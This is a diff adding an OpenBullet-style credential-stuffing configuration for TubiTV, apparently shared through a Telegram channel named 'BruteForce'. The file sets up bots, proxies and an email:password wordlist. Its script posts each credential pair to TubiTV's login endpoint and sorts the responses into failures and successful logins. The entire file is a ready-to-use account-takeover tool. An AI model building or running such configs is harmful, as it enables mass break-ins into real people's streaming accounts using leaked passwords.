@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "TubiTV",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-09-14T01:41:23.9349313+04:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce | No Capture",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#login REQUEST POST "https://tubitv.com/oz/auth/login/" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://tubitv.com" 
+  HEADER "referer: https://tubitv.com/login" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"message\":\"Invalid email/password combination\"}" 
+    KEY "Invalid email/password combination" 
+    KEY "Invalid email/password" 
+  KEYCHAIN Success OR 
+    KEY "{\"userId\":" 
+
+#CC FUNCTION Constant " T.me/BruteForce " -> CAP "Telegram Channel:" 
+
